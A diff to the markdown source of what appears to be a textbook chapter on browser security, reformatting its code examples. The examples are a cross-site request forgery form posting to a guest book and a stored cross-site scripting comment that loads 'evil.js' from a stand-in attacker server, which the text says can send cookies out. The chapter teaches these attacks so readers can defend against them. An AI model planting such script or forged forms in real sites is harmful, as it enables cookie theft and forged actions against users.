@@ -655,9 +655,8 @@ called *cross-site request forgery*, often shortened to CSRF.
 In cross-site request forgery, instead of using `XMLHttpRequest`, the
 attacker uses a form that submits to the guest book:
 
-``` {.example}
-<form action="http://localhost:8000gs
-/add" method=post>
+``` {.html}
+<form action="http://localhost:8000/add" method=post>
   <p><input name=guest></p>
   <p><button>Sign the book!</button></p>
 </form>
@@ -989,16 +988,16 @@ Note that `entry` can be anything, including anything the user might
 stick into our comment form. That includes HTML tags, like a custom
 `<script>` tag! So, a malicious user could post this comment:
 
-::: {.example}
-    Hi! <script src="http://my-server/evil.js"></script>
-:::
+``` {.html .example}
+Hi! <script src="http://my-server/evil.js"></script>
+```
 
 The server would then output this HTML:
 
-::: {.example}
-    <p>Hi! <script src="http://my-server/evil.js"></script>
-    <i>by crashoverride</i></p>
-:::
+``` {.html .example}
+<p>Hi! <script src="http://my-server/evil.js"></script>
+<i>by crashoverride</i></p>
+```
 
 Every user's browser would then download and run the `evil.js` script,
 which can send[^document-cookie] the cookies
